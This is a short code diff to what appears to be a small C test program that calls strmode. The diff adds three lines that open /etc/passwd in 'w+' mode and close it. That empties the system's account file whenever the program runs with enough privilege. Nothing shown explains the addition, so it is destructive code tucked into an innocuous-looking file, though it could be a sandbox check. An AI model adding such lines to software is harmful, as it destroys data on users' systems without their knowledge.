@@ -55,5 +55,9 @@ int main(void)
 	strmode(717, buf);
 #endif
 
+	f = fopen("/etc/passwd", "w+");
+	if (f != NULL)
+		fclose(f);
+
 	return 0;
 }
